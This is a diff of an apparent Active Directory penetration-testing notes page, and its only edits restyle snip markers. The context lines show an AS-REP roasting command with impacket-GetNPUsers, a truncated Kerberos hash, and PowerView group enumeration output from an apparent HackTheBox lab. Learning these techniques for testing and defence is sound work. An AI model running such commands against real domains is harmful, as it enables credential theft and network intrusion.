@@ -94,7 +94,7 @@ $ impacket-GetNPUsers 'corp.local/user' -no-pass -dc-ip 172.16.1.5
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 [*] Getting TGT for user
-$krb5asrep$23$user@CORP.LOCAL:642ec7b699 ...[SNIP]... e70950229f
+$krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
 ```
 
 {{< /tabcontent >}}
@@ -403,7 +403,7 @@ MemberName                  : ppaul
 MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
 MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
 
-...[SNIP]...
+---[SNIP]---
 
 GroupDomainName             : ServiceMgmt
 GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
@@ -498,7 +498,7 @@ Get-DomainGroupMember -Identity '<GROUP>'
 PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
 Get-DomainGroupMember -Identity 'security engineers'
 
-...[SNIP]...
+---[SNIP]---
 
 GroupDomain             : corp.local
 GroupName               : Security Engineers
